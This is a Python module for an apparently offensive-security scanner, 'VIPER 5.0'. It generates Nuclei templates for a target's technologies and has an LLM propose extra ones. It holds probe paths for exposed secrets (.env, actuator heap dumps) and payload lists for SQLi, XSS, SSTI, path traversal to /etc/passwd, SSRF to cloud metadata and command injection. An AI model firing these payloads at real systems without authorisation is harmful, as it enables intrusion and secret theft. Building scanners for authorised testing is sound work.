#!/usr/bin/env python3
"""
VIPER 5.0 — LLM-Powered Nuclei Template Generator

Analyzes a target's tech stack, discovered endpoints, and parameters
to generate custom Nuclei YAML templates tailored to that specific target.

Integrates with the hunt pipeline after surface mapping (Phase 3) to
auto-generate templates, then Nuclei runs them in Phase 4.
"""

import hashlib
import logging
import os
import re
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger("viper.template_generator")

HACKAGENT_DIR = Path(__file__).parent.parent
CUSTOM_TEMPLATES_DIR = HACKAGENT_DIR / "data" / "nuclei" / "custom" / "generated"

# Tech-specific vulnerability patterns: maps technology keywords to
# known vulnerability classes and the payloads/matchers that detect them.
TECH_VULN_MAP: Dict[str, List[Dict[str, Any]]] = {
    "wordpress": [
        {
            "id_suffix": "wp-xmlrpc",
            "name": "WordPress XML-RPC Enabled",
            "severity": "medium",
            "path": "/xmlrpc.php",
            "method": "POST",
            "body": '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
            "matchers": [{"type": "word", "words": ["system.listMethods", "pingback.ping"]}],
        },
        {
            "id_suffix": "wp-debug-log",
            "name": "WordPress Debug Log Exposed",
            "severity": "high",
            "path": "/wp-content/debug.log",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ["PHP Fatal error", "PHP Warning", "Stack trace"]},
                {"type": "status", "status": [200]},
            ],
        },
        {
            "id_suffix": "wp-user-enum",
            "name": "WordPress User Enumeration",
            "severity": "medium",
            "path": "/wp-json/wp/v2/users",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ['"slug"', '"name"', '"id"']},
                {"type": "status", "status": [200]},
            ],
        },
    ],
    "nginx": [
        {
            "id_suffix": "nginx-status",
            "name": "Nginx Status Page Exposed",
            "severity": "low",
            "path": "/nginx_status",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ["Active connections", "server accepts"]},
                {"type": "status", "status": [200]},
            ],
        },
        {
            "id_suffix": "nginx-off-by-slash",
            "name": "Nginx Off-By-Slash Path Traversal",
            "severity": "high",
            "path": "/static../etc/passwd",
            "method": "GET",
            "matchers": [{"type": "regex", "regex": [r"root:x:\d+:\d+"]}],
        },
    ],
    "apache": [
        {
            "id_suffix": "apache-server-status",
            "name": "Apache Server Status Exposed",
            "severity": "medium",
            "path": "/server-status",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ["Apache Server Status", "Total accesses"]},
                {"type": "status", "status": [200]},
            ],
        },
        {
            "id_suffix": "apache-server-info",
            "name": "Apache Server Info Exposed",
            "severity": "medium",
            "path": "/server-info",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ["Apache Server Information", "Module Name"]},
            ],
        },
    ],
    "php": [
        {
            "id_suffix": "phpinfo",
            "name": "PHPInfo Exposed",
            "severity": "medium",
            "path": "/phpinfo.php",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ["PHP Version", "Configuration", "php.ini"]},
                {"type": "status", "status": [200]},
            ],
        },
    ],
    "spring": [
        {
            "id_suffix": "spring-actuator-env",
            "name": "Spring Actuator Environment Exposed",
            "severity": "high",
            "path": "/actuator/env",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ['"propertySources"', '"activeProfiles"']},
                {"type": "status", "status": [200]},
            ],
        },
        {
            "id_suffix": "spring-actuator-heapdump",
            "name": "Spring Actuator Heap Dump Accessible",
            "severity": "critical",
            "path": "/actuator/heapdump",
            "method": "GET",
            "matchers": [{"type": "status", "status": [200]}],
        },
    ],
    "laravel": [
        {
            "id_suffix": "laravel-debug",
            "name": "Laravel Debug Mode Enabled",
            "severity": "high",
            "path": "/",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ["Whoops!", "Laravel", "IgnitionServiceProvider"]},
            ],
        },
        {
            "id_suffix": "laravel-env",
            "name": "Laravel .env File Exposed",
            "severity": "critical",
            "path": "/.env",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ["APP_KEY=", "DB_PASSWORD=", "APP_ENV="]},
                {"type": "status", "status": [200]},
            ],
        },
    ],
    "django": [
        {
            "id_suffix": "django-debug",
            "name": "Django Debug Mode Enabled",
            "severity": "high",
            "path": "/nonexistent-page-debug-test",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ["Django", "Traceback", "INSTALLED_APPS"]},
            ],
        },
    ],
    "express": [
        {
            "id_suffix": "express-stack-trace",
            "name": "Express.js Stack Trace Disclosure",
            "severity": "medium",
            "path": "/api/%00",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ["at Function", "at Layer.handle", "node_modules"]},
            ],
        },
    ],
    "graphql": [
        {
            "id_suffix": "graphql-introspection",
            "name": "GraphQL Introspection Enabled",
            "severity": "medium",
            "path": "/graphql",
            "method": "POST",
            "body": '{"query":"{__schema{types{name}}}"}',
            "headers": {"Content-Type": "application/json"},
            "matchers": [
                {"type": "word", "words": ['"__schema"', '"types"', '"name"']},
                {"type": "status", "status": [200]},
            ],
        },
    ],
    "docker": [
        {
            "id_suffix": "docker-api-exposed",
            "name": "Docker Remote API Exposed",
            "severity": "critical",
            "path": "/v2/_catalog",
            "method": "GET",
            "matchers": [
                {"type": "word", "words": ['"repositories"']},
                {"type": "status", "status": [200]},
            ],
        },
    ],
}

# Payload sets for parameter fuzzing
FUZZ_PAYLOADS = {
    "sqli": [
        "'",
        "' OR '1'='1",
        "1 UNION SELECT NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
    ],
    "xss": [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        "{{constructor.constructor('alert(1)')()}}",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{%25 import os %}{{os.popen('id').read()}}",
    ],
    "lfi": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
    ],
    "ssrf": [
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "http://0x7f000001",
    ],
    "cmdi": [
        ";id",
        "|id",
        "$(id)",
        "`id`",
    ],
}

# Matchers corresponding to each payload category
FUZZ_MATCHERS = {
    "sqli": {
        "type": "regex",
        "regex": [
            r"SQL.*syntax",
            r"mysql_fetch",
            r"ORA-\d{4,5}",
            r"PostgreSQL.*ERROR",
            r"Unclosed quotation mark",
            r"SQLITE_ERROR",
        ],
    },
    "xss": {
        "type": "word",
        "words": ["<script>alert(1)</script>", 'onerror=alert(1)'],
    },
    "ssti": {
        "type": "word",
        "words": ["49"],  # 7*7
    },
    "lfi": {
        "type": "regex",
        "regex": [r"root:x:\d+:\d+", r"\[extensions\]"],  # passwd or win.ini
    },
    "ssrf": {
        "type": "regex",
        "regex": [r"ami-id|instance-id|127\.0\.0\.1|localhost"],
    },
    "cmdi": {
        "type": "regex",
        "regex": [r"uid=\d+\(", r"gid=\d+"],
    },
}


class NucleiTemplateGenerator:
    """LLM-powered Nuclei template generator.

    Analyzes a target's tech stack and generates custom Nuclei YAML
    templates specific to that target's vulnerabilities.

    Two generation modes:
    1. Rule-based: Uses TECH_VULN_MAP for known tech-specific templates
       and generates parameter-fuzzing templates from discovered params.
    2. LLM-assisted: Uses ModelRouter to generate novel templates based
       on the target's unique characteristics (when a router is available).
    """

    def __init__(self, model_router=None, output_dir: Optional[str] = None):
        self.router = model_router
        self.output_dir = Path(output_dir) if output_dir else CUSTOM_TEMPLATES_DIR
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self._generated_count = 0

    async def generate_for_target(
        self,
        target_url: str,
        technologies: List[str],
        endpoints: List[str],
        parameters: Dict[str, List[str]],
    ) -> List[str]:
        """Generate custom Nuclei templates for a specific target.

        Args:
            target_url: The base URL of the target.
            technologies: List of detected technology names (e.g. ["nginx", "php", "wordpress"]).
            endpoints: List of discovered endpoint paths.
            parameters: Mapping of endpoint path -> list of parameter names.

        Returns:
            List of YAML template strings ready for Nuclei.
        """
        templates: List[str] = []

        # 1) Tech-specific templates from the static mapping
        for tech in technologies:
            tech_lower = tech.lower()
            for key, vuln_list in TECH_VULN_MAP.items():
                if key in tech_lower:
                    for vuln_def in vuln_list:
                        tpl = self._build_tech_template(tech, vuln_def)
                        templates.append(tpl)

        # 2) Parameter-fuzzing templates for each discovered endpoint
        for endpoint, params in parameters.items():
            if params:
                tpl = self._generate_param_template(endpoint, params)
                templates.append(tpl)

        # 3) LLM-assisted generation for edge cases
        if self.router:
            llm_templates = await self._generate_llm_templates(
                target_url, technologies, endpoints, parameters
            )
            templates.extend(llm_templates)

        logger.info(
            "Generated %d custom Nuclei templates for %s", len(templates), target_url
        )
        self._generated_count = len(templates)
        return templates

    def _build_tech_template(self, tech: str, vuln_def: Dict[str, Any]) -> str:
        """Build a YAML template from a tech-specific vulnerability definition."""
        tpl_id = f"viper-{vuln_def['id_suffix']}"
        severity = vuln_def["severity"]
        name = vuln_def["name"]
        method = vuln_def.get("method", "GET")
        path = vuln_def["path"]

        lines = [
            f"id: {tpl_id}",
            "",
            "info:",
            f"  name: {name}",
            "  author: viper",
            f"  severity: {severity}",
            f"  description: Auto-generated template for {tech} - {name}",
            "  tags: custom,viper,auto-generated",
            "",
            "http:",
            f"  - method: {method}",
            "    path:",
            f'      - "{{{{BaseURL}}}}{path}"',
        ]

        # Add request body if present
        if "body" in vuln_def:
            lines.append(f'    body: \'{vuln_def["body"]}\'')

        # Add custom headers if present
        if "headers" in vuln_def:
            lines.append("    headers:")
            for hk, hv in vuln_def["headers"].items():
                lines.append(f"      {hk}: {hv}")

        # Matchers
        matchers = vuln_def.get("matchers", [])
        if len(matchers) > 1:
            lines.append("    matchers-condition: and")
        lines.append("    matchers:")
        for m in matchers:
            lines.append(f"      - type: {m['type']}")
            if m["type"] == "word":
                lines.append("        words:")
                for w in m["words"]:
                    lines.append(f'          - "{w}"')
            elif m["type"] == "regex":
                lines.append("        regex:")
                for r in m["regex"]:
                    lines.append(f'          - "{r}"')
            elif m["type"] == "status":
                lines.append("        status:")
                for s in m["status"]:
                    lines.append(f"          - {s}")

        return "\n".join(lines)

    def _generate_param_template(self, endpoint: str, params: List[str]) -> str:
        """Generate a multi-category fuzzing template for an endpoint's parameters.

        Creates a single template that tests each parameter with SQLi, XSS, SSTI,
        LFI, SSRF, and command injection payloads.
        """
        endpoint_hash = hashlib.md5(endpoint.encode()).hexdigest()[:8]
        # Sanitize endpoint for display
        safe_endpoint = re.sub(r"[^a-zA-Z0-9/_-]", "", endpoint)[:60]

        lines = [
            f"id: viper-param-fuzz-{endpoint_hash}",
            "",
            "info:",
            f"  name: Parameter Fuzz - {safe_endpoint}",
            "  author: viper",
            "  severity: medium",
            "  description: Auto-generated parameter fuzzing template",
            "  tags: custom,viper,param-fuzz",
            "",
            "http:",
            "  - method: GET",
            "    path:",
        ]

        # Build paths: one per parameter with the fuzz marker
        for param in params[:10]:  # cap at 10 params to keep template reasonable
            safe_param = re.sub(r"[^a-zA-Z0-9_-]", "", param)
            lines.append(
                f'      - "{{{{BaseURL}}}}{endpoint}?{safe_param}={{{{fuzz}}}}"'
            )

        # Payloads: combine a representative subset from each category
        lines.append("    payloads:")
        lines.append("      fuzz:")
        added = set()
        for category in ["sqli", "xss", "ssti", "lfi"]:
            for payload in FUZZ_PAYLOADS[category][:2]:
                if payload not in added:
                    escaped = payload.replace('"', '\\"')
                    lines.append(f'        - "{escaped}"')
                    added.add(payload)

        # Matchers: one per vulnerability class
        lines.append("    matchers-condition: or")
        lines.append("    matchers:")
        for category in ["sqli", "xss", "ssti", "lfi"]:
            matcher = FUZZ_MATCHERS[category]
            lines.append(f"      - type: {matcher['type']}")
            key = "words" if matcher["type"] == "word" else "regex"
            lines.append(f"        {key}:")
            for val in matcher[key]:
                escaped = val.replace('"', '\\"')
                lines.append(f'          - "{escaped}"')

        return "\n".join(lines)

    async def _generate_llm_templates(
        self,
        target_url: str,
        technologies: List[str],
        endpoints: List[str],
        parameters: Dict[str, List[str]],
    ) -> List[str]:
        """Use the LLM to generate novel templates based on target characteristics."""
        if not self.router:
            return []

        tech_str = ", ".join(technologies[:15])
        endpoint_str = "\n".join(f"  - {e}" for e in endpoints[:20])
        param_str = "\n".join(
            f"  {ep}: {', '.join(ps[:5])}" for ep, ps in list(parameters.items())[:10]
        )

        prompt = f"""Analyze this target and generate 1-3 custom Nuclei YAML templates
for vulnerability classes NOT covered by standard Nuclei templates.

Target: {target_url}
Technologies: {tech_str}
Endpoints:
{endpoint_str}
Parameters:
{param_str}

Generate YAML templates that test for:
- Business logic flaws specific to this tech stack
- Misconfigurations unique to these technologies
- Chained vulnerabilities across endpoints

Return ONLY valid Nuclei YAML templates separated by '---'.
Each template must have: id, info (name, author, severity, tags), and http sections.
Use viper- prefix for template IDs. Set author to 'viper'.
"""

        try:
            response = await self.router.complete(
                prompt=prompt,
                system="You are a security researcher generating Nuclei YAML templates. "
                "Output only valid YAML. No explanations.",
                max_tokens=2000,
            )
            raw = response.text if hasattr(response, "text") else str(response)
            return self._parse_llm_templates(raw)
        except Exception as e:
            logger.warning("LLM template generation failed: %s", e)
            return []

    def _parse_llm_templates(self, raw_text: str) -> List[str]:
        """Parse LLM output into individual template strings.

        Validates each template has required fields before accepting it.
        """
        templates: List[str] = []
        # Split on YAML document separator
        parts = re.split(r"\n---\n", raw_text)

        for part in parts:
            part = part.strip()
            # Remove markdown code fences if present
            part = re.sub(r"^```ya?ml\s*\n?", "", part)
            part = re.sub(r"\n?```\s*$", "", part)
            part = part.strip()

            if not part:
                continue

            # Validate minimum required fields
            has_id = re.search(r"^id:\s*\S+", part, re.MULTILINE)
            has_info = "info:" in part
            has_http = "http:" in part
            has_name = "name:" in part

            if has_id and has_info and has_http and has_name:
                # Ensure viper- prefix
                id_match = re.search(r"^id:\s*(\S+)", part, re.MULTILINE)
                if id_match and not id_match.group(1).startswith("viper-"):
                    part = part.replace(
                        f"id: {id_match.group(1)}",
                        f"id: viper-llm-{id_match.group(1)}",
                        1,
                    )
                templates.append(part)
            else:
                logger.debug("Rejected LLM template (missing fields): %.80s...", part)

        return templates

    def save_templates(
        self, templates: List[str], output_dir: Optional[str] = None
    ) -> List[Path]:
        """Save generated templates to disk as individual YAML files.

        Args:
            templates: List of YAML template strings.
            output_dir: Override directory. Defaults to data/nuclei/custom/generated.

        Returns:
            List of file paths where templates were saved.
        """
        out = Path(output_dir) if output_dir else self.output_dir
        out.mkdir(parents=True, exist_ok=True)

        saved: List[Path] = []
        for tpl in templates:
            # Extract template ID for filename
            id_match = re.search(r"^id:\s*(\S+)", tpl, re.MULTILINE)
            if id_match:
                filename = f"{id_match.group(1)}.yaml"
            else:
                filename = f"viper-gen-{hashlib.md5(tpl.encode()).hexdigest()[:8]}.yaml"

            filepath = out / filename
            filepath.write_text(tpl, encoding="utf-8")
            saved.append(filepath)
            logger.debug("Saved template: %s", filepath)

        logger.info("Saved %d templates to %s", len(saved), out)
        return saved

    def cleanup_generated(self, output_dir: Optional[str] = None):
        """Remove all previously generated templates."""
        out = Path(output_dir) if output_dir else self.output_dir
        if out.exists():
            for f in out.glob("viper-*.yaml"):
                f.unlink()
            logger.info("Cleaned up generated templates in %s", out)

    @property
    def generated_count(self) -> int:
        return self._generated_count
